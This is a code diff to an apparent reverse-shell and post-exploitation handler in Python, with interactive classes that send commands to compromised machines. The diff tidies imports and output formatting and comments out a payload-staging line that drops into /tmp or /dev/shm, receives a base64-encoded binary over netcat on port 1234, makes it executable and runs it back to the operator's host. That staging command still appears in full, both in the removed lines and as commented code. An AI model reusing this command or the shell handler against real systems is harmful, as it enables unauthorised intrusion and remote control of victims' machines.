@@ -1,8 +1,8 @@
 #!/usr/bin/python3
 
-from modules.utils import listen, send_file, chk_payload
+from modules.utils import send_file, chk_payload
 from modules.sysinfo import SystemInfoGatherer
-from modules.nethelper import netshell_loop, pretty
+from modules.nethelper import netshell_loop, pretty, listen
 from threading import Thread
 import logging
 import socket
@@ -104,14 +104,14 @@ class NetShell(cmd.Cmd):
                 f.write(f"{contents}\n")
 
     def do_run(self, line):
-        self.output = self.server.send_command(line)
+        self.output = pretty(self.server.send_command(line))
         if self.output:
-            sys.stdout.write(f"{pretty(self.output)}\n")
+            sys.stdout.write(f"{self.output}\n")
 
     def do_cd(self, line):
-        self.output = self.server.send_command(f"cd {line}")
+        self.output = pretty(self.server.send_command(f"cd {line}"))
         if self.output:
-            sys.stdout.write(f"{pretty(self.output)}\n")
+            sys.stdout.write(f"{self.output}\n")
 
     def do_exit(self, line):
         logging.info(f"Closing connection from session {self.id +1}")
@@ -171,15 +171,15 @@ class LocalShell(cmd.Cmd):
         if sock.sysinfo.is_nc:
             logging.info(f"Sending payload..")
 
-            sock.client_socket.send(f"cd /tmp || cd /var/tmp || cd /dev/shm ; touch payload ; chmod +x payload ;" \
-                                            f"setsid sh -c '{sock.sysinfo.is_nc} -lnp 1234 | base64 -d > payload ;"\
-                                            f"sleep 5 ; ./payload {host} {port}'\n"\
-                                            .encode())
+            # sock.client_socket.send(f"cd /tmp || cd /var/tmp || cd /dev/shm ; touch payload ; chmod +x payload ;" \
+            #                                 f"setsid sh -c '{sock.sysinfo.is_nc} -lnp 1234 | base64 -d > payload ;"\
+            #                                 f"sleep 5 ; ./payload {host} {port}'\n"\
+            #                                 .encode())
 
             # TODO: add a check that confirms that netcat is running if not just skip 
             sock.server_socket.close()
             sock.client_socket.close()
-            send_file(os.path.join(PROJ_DIR, "payloads/payload"), host, 1234)
+            # send_file(os.path.join(PROJ_DIR, "payloads/payload"), host, 1234)
             logging.info(f"Payload sent. Starting listener..")
             
             sock = listen(host, port, 1)
